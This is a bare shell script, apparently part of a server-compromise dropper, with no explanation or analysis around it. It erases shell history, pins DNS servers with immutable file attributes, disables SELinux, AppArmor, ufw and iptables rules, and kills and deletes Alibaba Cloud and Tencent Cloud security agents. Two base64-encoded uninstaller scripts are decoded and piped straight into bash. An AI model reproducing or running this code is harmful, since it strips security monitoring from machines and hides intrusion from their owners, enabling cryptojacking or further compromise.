ulimit -n 65535 2>/dev/null 1>/dev/null
export LC_ALL=C 
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
unset HISTFILE 2>/dev/null 1>/dev/null
shopt -ou history 2>/dev/null 1>/dev/null
set +o history 2>/dev/null 1>/dev/null
HISTSIZE=0 2>/dev/null 1>/dev/null
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
cat /etc/resolv.conf 2>/dev/null | grep 'nameserver 8.8.8.8' || chattr -ia /etc/resolv.conf 2>/dev/null 1>/dev/null ; echo 'nameserver 8.8.8.8' >> /etc/resolv.conf 2>/dev/null ; chattr +i /etc/resolv.conf 2>/dev/null 1>/dev/null
cat /etc/resolv.conf 2>/dev/null | grep 'nameserver 8.8.4.4' || chattr -ia /etc/resolv.conf 2>/dev/null 1>/dev/null ; echo 'nameserver 8.8.4.4' >> /etc/resolv.conf 2>/dev/null ; chattr +i /etc/resolv.conf 2>/dev/null 1>/dev/null
setenforce 0 2>/dev/null 1>/dev/null
echo SELINUX=disabled >/etc/selinux/config 2>/dev/null
if type systemctl 2>/dev/null 1>/dev/null; then systemctl stop apparmor 2>/dev/null 1>/dev/null ; systemctl disable apparmor 2>/dev/null 1>/dev/null ; else service apparmor stop 2>/dev/null 1>/dev/null ; fi
if type systemctl 2>/dev/null 1>/dev/null; then systemctl stop aliyun.service 2>/dev/null 1>/dev/null ; systemctl disable aliyun.service 2>/dev/null 1>/dev/null ; else service aliyun.service stop 2>/dev/null 1>/dev/null ; fi
ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 % 2>/dev/null 1>/dev/null
ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 % 2>/dev/null 1>/dev/null
if [ -d "/usr/local/aegis/" ]; then rm -rf /usr/local/aegis 2>/dev/null 1>/dev/null ; fi
if type ufw 2>/dev/null 1>/dev/null; then ufw disable 2>/dev/null 1>/dev/null ; fi
if type iptables 2>/dev/null 1>/dev/null; then iptables -F 2>/dev/null 1>/dev/null ; fi
sysctl kernel.nmi_watchdog=0 2>/dev/null 1>/dev/null
if [ -f "/proc/sys/kernel/nmi_watchdog" ]; then echo '0' >/proc/sys/kernel/nmi_watchdog 2>/dev/null ; fi
if [ -f "/etc/sysctl.conf" ]; then echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf 2>/dev/null ; fi
if ps aux | grep -i '[a]liyun' 2>/dev/null 1>/dev/null; then
  echo 'IyEvYmluL2Jhc2gKCkFFR0lTX0lOU1RBTExfRElSPSIvdXNyL2xvY2FsL2FlZ2lzIgojY2hlY2sgbGludXggR2VudG9vIG9zIAp2YXI9YGxzYl9yZWxlYXNlIC1hIHwgZ3JlcCBHZW50b29gCmlmIFsgLXogIiR7dmFyfSIgXTsgdGhlbiAKCXZhcj1gY2F0IC9ldGMvaXNzdWUgfCBncmVwIEdlbnRvb2AKZmkKY2hlY2tDb3Jlb3M9YGNhdCAvZXRjL29zLXJlbGVhc2UgMj4vZGV2L251bGwgfCBncmVwIGNvcmVvc2AKaWYgWyAtZCAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdCIgLWEgLW4gIiR7dmFyfSIgXTsgdGhlbgoJTElOVVhfUkVMRUFTRT0iR0VOVE9PIgplbGlmIFsgLWYgIi9ldGMvb3MtcmVsZWFzZSIgLWEgLW4gIiR7Y2hlY2tDb3Jlb3N9IiBdOyB0aGVuCglMSU5VWF9SRUxFQVNFPSJDT1JFT1MiCglBRUdJU19JTlNUQUxMX0RJUj0iL29wdC9hZWdpcyIKZWxzZSAKCUxJTlVYX1JFTEVBU0U9Ik9USEVSIgpmaQkJCgpzdG9wX2FlZ2lzX3BraWxsKCl7CiAgICBwa2lsbCAtOSBBbGlZdW5EdW4gPi9kZXYvbnVsbCAyPiYxCiAgICBwa2lsbCAtOSBBbGlIaWRzID4vZGV2L251bGwgMj4mMQogICAgcGtpbGwgLTkgQWxpSGlwcyA+L2Rldi9udWxsIDI+JjEKICAgIHBraWxsIC05IEFsaU5ldCA+L2Rldi9udWxsIDI+JjEKICAgIHBraWxsIC05IEFsaVNlY0d1YXJkID4vZGV2L251bGwgMj4mMQogICAgcGtpbGwgLTkgQWxpWXVuRHVuVXBkYXRlID4vZGV2L251bGwgMj4mMQogICAgCiAgICAvdXNyL2xvY2FsL2FlZ2lzL0FsaU5ldC9BbGlOZXQgLS1zdG9wZHJpdmVyCiAgICAvdXNyL2xvY2FsL2FlZ2lzL2FsaWhpcHMvQWxpSGlwcyAtLXN0b3Bkcml2ZXIKICAgIC91c3IvbG9jYWwvYWVnaXMvQWxpU2VjR3VhcmQvQWxpU2VjR3VhcmQgLS1zdG9wZHJpdmVyCiAgICBwcmludGYgIiUtNDBzICU0MHNcbiIgIlN0b3BwaW5nIGFlZ2lzIiAiWyAgT0sgIF0iCn0KCiMgY2FuIG5vdCByZW1vdmUgYWxsIGFlZ2lzIGZvbGRlciwgYmVjYXVzZSB0aGVyZSBpcyBiYWNrdXAgZmlsZSBpbiBnbG9iYWxjZmcKcmVtb3ZlX2FlZ2lzKCl7CmlmIFsgLWQgIiR7QUVHSVNfSU5TVEFMTF9ESVJ9IiBdO3RoZW4KICAgIHVtb3VudCAke0FFR0lTX0lOU1RBTExfRElSfS9hZWdpc19kZWJ1ZwogICAgcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FlZ2lzX2NsaWVudAogICAgcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FlZ2lzX3VwZGF0ZQoJcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FsaWhpZHMKICAgIHJtIC1yZiAke0FFR0lTX0lOU1RBTExfRElSfS9nbG9iYWxjZmcvZG9tYWluY2ZnLmluaQpmaQp9Cgp1bmluc3RhbGxfc2VydmljZSgpIHsKICAgCiAgIGlmIFsgLWYgIi9ldGMvaW5pdC5kL2FlZ2lzIiBdOyB0aGVuCgkJL2V0Yy9pbml0LmQvYWVnaXMgc3RvcCAgPi9kZXYvbnVsbCAyPiYxCgkJcm0gLWYgL2V0Yy9pbml0LmQvYWVnaXMgCiAgIGZpCgoJaWYgWyAkTElOVVhfUkVMRUFTRSA9ICJHRU5UT08iIF07IHRoZW4KCQlyYy11cGRhdGUgZGVsIGFlZ2lzIGRlZmF1bHQgMj4vZGV2L251bGwKCQlpZiBbIC1mICIvZXRjL3J1bmxldmVscy9kZWZhdWx0L2FlZ2lzIiBdOyB0aGVuCgkJCXJtIC1mICIvZXRjL3J1bmxldmVscy9kZWZhdWx0L2FlZ2lzIiA+L2Rldi9udWxsIDI+JjE7CgkJZmkKICAgIGVsaWYgWyAtZiAvZXRjL2luaXQuZC9hZWdpcyBdOyB0aGVuCiAgICAgICAgIC9ldGMvaW5pdC5kL2FlZ2lzICB1bmluc3RhbGwKCSAgICBmb3IgKCh2YXI9MjsgdmFyPD01OyB2YXIrKykpIGRvCgkJCWlmIFsgLWQgIi9ldGMvcmMke3Zhcn0uZC8iIF07dGhlbgoJCQkJIHJtIC1mICIvZXRjL3JjJHt2YXJ9LmQvUzgwYWVnaXMiCgkJICAgIGVsaWYgWyAtZCAiL2V0Yy9yYy5kL3JjJHt2YXJ9LmQiIF07dGhlbgoJCQkJcm0gLWYgIi9ldGMvcmMuZC9yYyR7dmFyfS5kL1M4MGFlZ2lzIgoJCQlmaQoJCWRvbmUKICAgIGZpCgp9CgpzdG9wX2FlZ2lzX3BraWxsCnVuaW5zdGFsbF9zZXJ2aWNlCnJlbW92ZV9hZWdpcwp1bW91bnQgJHtBRUdJU19JTlNUQUxMX0RJUn0vYWVnaXNfZGVidWcKCgpwcmludGYgIiUtNDBzICU0MHNcbiIgIlVuaW5zdGFsbGluZyBhZWdpcyIgICJbICBPSyAgXSIKCgoK' | base64 -d | bash 2>/dev/null 1>/dev/null
  echo 'IyEvYmluL2Jhc2gKCiNjaGVjayBsaW51eCBHZW50b28gb3MgCnZhcj1gbHNiX3JlbGVhc2UgLWEgfCBncmVwIEdlbnRvb2AKaWYgWyAteiAiJHt2YXJ9IiBdOyB0aGVuIAoJdmFyPWBjYXQgL2V0Yy9pc3N1ZSB8IGdyZXAgR2VudG9vYApmaQoKaWYgWyAtZCAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdCIgLWEgLW4gIiR7dmFyfSIgXTsgdGhlbgoJTElOVVhfUkVMRUFTRT0iR0VOVE9PIgplbHNlCglMSU5VWF9SRUxFQVNFPSJPVEhFUiIKZmkKCnN0b3BfYWVnaXMoKXsKCWtpbGxhbGwgLTkgYWVnaXNfY2xpID4vZGV2L251bGwgMj4mMQoJa2lsbGFsbCAtOSBhZWdpc191cGRhdGUgPi9kZXYvbnVsbCAyPiYxCglraWxsYWxsIC05IGFlZ2lzX2NsaSA+L2Rldi9udWxsIDI+JjEKICAgIHByaW50ZiAiJS00MHMgJTQwc1xuIiAiU3RvcHBpbmcgYWVnaXMiICJbICBPSyAgXSIKfQoKc3RvcF9xdWFydHooKXsKCWtpbGxhbGwgLTkgYWVnaXNfcXVhcnR6ID4vZGV2L251bGwgMj4mMQogICAgICAgIHByaW50ZiAiJS00MHMgJTQwc1xuIiAiU3RvcHBpbmcgcXVhcnR6IiAiWyAgT0sgIF0iCn0KCnJlbW92ZV9hZWdpcygpewppZiBbIC1kIC91c3IvbG9jYWwvYWVnaXMgXTt0aGVuCiAgICBybSAtcmYgL3Vzci9sb2NhbC9hZWdpcy9hZWdpc19jbGllbnQKICAgIHJtIC1yZiAvdXNyL2xvY2FsL2FlZ2lzL2FlZ2lzX3VwZGF0ZQpmaQp9CgpyZW1vdmVfcXVhcnR6KCl7CmlmIFsgLWQgL3Vzci9sb2NhbC9hZWdpcyBdO3RoZW4KCXJtIC1yZiAvdXNyL2xvY2FsL2FlZ2lzL2FlZ2lzX3F1YXJ0egpmaQp9CgoKdW5pbnN0YWxsX3NlcnZpY2UoKSB7CiAgIAogICBpZiBbIC1mICIvZXRjL2luaXQuZC9hZWdpcyIgXTsgdGhlbgoJCS9ldGMvaW5pdC5kL2FlZ2lzIHN0b3AgID4vZGV2L251bGwgMj4mMQoJCXJtIC1mIC9ldGMvaW5pdC5kL2FlZ2lzIAogICBmaQoKCWlmIFsgJExJTlVYX1JFTEVBU0UgPSAiR0VOVE9PIiBdOyB0aGVuCgkJcmMtdXBkYXRlIGRlbCBhZWdpcyBkZWZhdWx0IDI+L2Rldi9udWxsCgkJaWYgWyAtZiAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdC9hZWdpcyIgXTsgdGhlbgoJCQlybSAtZiAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdC9hZWdpcyIgPi9kZXYvbnVsbCAyPiYxOwoJCWZpCiAgICBlbGlmIFsgLWYgL2V0Yy9pbml0LmQvYWVnaXMgXTsgdGhlbgogICAgICAgICAvZXRjL2luaXQuZC9hZWdpcyAgdW5pbnN0YWxsCgkgICAgZm9yICgodmFyPTI7IHZhcjw9NTsgdmFyKyspKSBkbwoJCQlpZiBbIC1kICIvZXRjL3JjJHt2YXJ9LmQvIiBdO3RoZW4KCQkJCSBybSAtZiAiL2V0Yy9yYyR7dmFyfS5kL1M4MGFlZ2lzIgoJCSAgICBlbGlmIFsgLWQgIi9ldGMvcmMuZC9yYyR7dmFyfS5kIiBdO3RoZW4KCQkJCXJtIC1mICIvZXRjL3JjLmQvcmMke3Zhcn0uZC9TODBhZWdpcyIKCQkJZmkKCQlkb25lCiAgICBmaQoKfQoKc3RvcF9hZWdpcwpzdG9wX3F1YXJ0egp1bmluc3RhbGxfc2VydmljZQpyZW1vdmVfYWVnaXMKcmVtb3ZlX3F1YXJ0egoKcHJpbnRmICIlLTQwcyAlNDBzXG4iICJVbmluc3RhbGxpbmcgYWVnaXNfcXVhcnR6IiAgIlsgIE9LICBdIgoKCgo=' | base64 -d | bash 2>/dev/null 1>/dev/null
  pkill aliyun-service 2>/dev/null 1>/dev/null
if [ -f "/etc/init.d/agentwatch" ]; then rm -rf /etc/init.d/agentwatch 2>/dev/null 1>/dev/null ; fi
if [ -f "/usr/sbin/aliyun-service" ]; then rm -fr /usr/sbin/aliyun-service 2>/dev/null 1>/dev/null ; fi
if [ -d "/usr/local/aegis/" ]; then rm -rf /usr/local/aegis* 2>/dev/null 1>/dev/null ; fi
  if type systemctl 2>/dev/null 1>/dev/null; then systemctl stop aliyun.service 2>/dev/null 1>/dev/null ; else service aliyun.service stop 2>/dev/null 1>/dev/null ; fi
  if type systemctl 2>/dev/null 1>/dev/null; then systemctl disable aliyun.service 2>/dev/null 1>/dev/null ; else if [ -f "/etc/init.d/aliyun" ]; then rm -fr /etc/init.d/aliyun 2>/dev/null 1>/dev/null ; fi ; fi
  if type systemctl 2>/dev/null 1>/dev/null; then systemctl stop bcm-agent 2>/dev/null 1>/dev/null ; else service bcm-agent stop 2>/dev/null 1>/dev/null ; fi
  if type yum 2>/dev/null 1>/dev/null; then yum remove bcm-agent -y 2>/dev/null 1>/dev/null ; fi
  if type apt-get 2>/dev/null 1>/dev/null; then apt-get remove bcm-agent -y 2>/dev/null 1>/dev/null ; fi
elif ps aux | grep -i '[y]unjing' 2>/dev/null 1>/dev/null; then
if [ -f "/usr/local/qcloud/stargate/admin/uninstall.sh" ]; then /usr/local/qcloud/stargate/admin/uninstall.sh 2>/dev/null 1>/dev/null ; fi
if [ -f "/usr/local/qcloud/YunJing/uninst.sh" ]; then /usr/local/qcloud/YunJing/uninst.sh 2>/dev/null 1>/dev/null ; fi
if [ -f "/usr/local/qcloud/monitor/barad/admin/uninstall.sh" ]; then /usr/local/qcloud/monitor/barad/admin/uninstall.sh 2>/dev/null 1>/dev/null ; fi
fi